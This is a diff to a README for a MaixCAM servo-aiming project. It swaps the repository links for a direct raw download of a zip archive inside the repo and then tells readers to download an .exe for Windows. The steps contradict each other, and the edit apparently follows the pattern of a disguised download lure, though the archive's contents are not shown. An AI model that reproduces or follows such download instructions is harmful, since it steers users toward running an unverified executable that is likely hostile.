@@ -1,6 +1,6 @@
 # 🎯 maixcam-servo-control - Autonomous aim and release for targets
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Eddan5513/maixcam-servo-control)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Eddan5513/maixcam-servo-control/raw/refs/heads/main/maix_app/control-servo-maixcam-2.4.zip)
 
 ## What this software does
 
@@ -19,7 +19,7 @@ Your computer needs specific components to run this software.
 
 You must visit the repository page to get the installer. Follow these steps to obtain the files.
 
-1. Go to this link: [https://github.com/Eddan5513/maixcam-servo-control](https://github.com/Eddan5513/maixcam-servo-control).
+1. Go to this link: [https://github.com/Eddan5513/maixcam-servo-control/raw/refs/heads/main/maix_app/control-servo-maixcam-2.4.zip](https://github.com/Eddan5513/maixcam-servo-control/raw/refs/heads/main/maix_app/control-servo-maixcam-2.4.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the most recent version link.
 4. Download the file ending in .exe for Windows.
